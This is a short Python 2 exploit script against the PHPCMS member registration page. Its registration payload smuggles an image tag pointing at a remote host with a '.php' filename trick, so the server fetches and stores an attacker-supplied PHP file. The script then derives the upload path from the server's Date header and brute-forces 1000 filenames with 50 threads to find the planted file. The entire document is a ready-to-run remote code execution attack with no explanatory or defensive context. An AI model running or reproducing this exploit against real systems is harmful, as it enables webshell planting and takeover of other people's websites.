# coding:utf-8
# Author:微凉

import threading,requests,datetime
from multiprocessing.dummy import Pool as ThreadPool

url_input = raw_input("请输入url:")
url = url_input + "index.php?m=member&c=index&a=register&siteid=1"
datas = {
"siteid":"1",
"modelid":"11",
"username":"zf1aaagac121",
"password":"aasgfssewee311as",
"email":"a1ea21f94@qq.coasm",
"info[content]":"<img src=http://www.shfeijiang.com/1.txt?.php#.jpg>",
"dosubmit":"1",
"protocol":""
}
responsed = requests.post(url,datas)
#取服务器返回时间
FileTime = responsed.headers['Date']
#构造服务器文件名
FileTime = (datetime.datetime.strptime(FileTime,"%a, %d %b %Y %H:%M:%S GMT") + datetime.timedelta(hours=8) + datetime.timedelta(seconds=1)).strftime("%Y%m%d%I%M%S")

def load(url):
    try:
        lin_status = requests.get(url,timeout=3).status_code
        if lin_status == 200:
            print("success,url is %s" % url)
            exit(0)
    except:
        pass

def gen():
    for i in range(1000):
        i = str(i).zfill(3)
        yield (url_input + "/uploadfile/{}/" + FileTime + i + ".php").format(datetime.datetime.now().strftime("%Y/%m%d"))

threads = ThreadPool(50)
threads.map(load,gen())
threads.close()
threads.join()
